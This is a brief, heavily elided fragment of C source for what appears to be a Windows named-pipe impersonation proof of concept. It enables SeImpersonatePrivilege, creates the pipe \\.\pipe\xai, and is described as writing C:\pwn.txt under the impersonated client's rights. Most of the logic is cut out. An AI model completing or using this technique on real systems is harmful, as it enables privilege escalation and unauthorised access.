/* Creates a namedpipe \\.\pipe\xai, then impersonates the client connecting to it.
   ...
   Hardcoded to write C:\pwn.txt
   compile with mingw - x86_64-w64-mingw32-gcc -D UNICODE np_createFile.c -o np_createFile.exe
...
LPWSTR fileName = L"C:\\pwn.txt"; // Change filepath
...
int main(int argc, TCHAR *argv)
{
	...
	if (EnableWindowsPrivilege(SE_IMPERSONATE_NAME)) {
		...
		hPipe = CreateNamedPipe(L"\\\\.\\pipe\\xai", PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT, 2, 0, 0, 0, &sa);
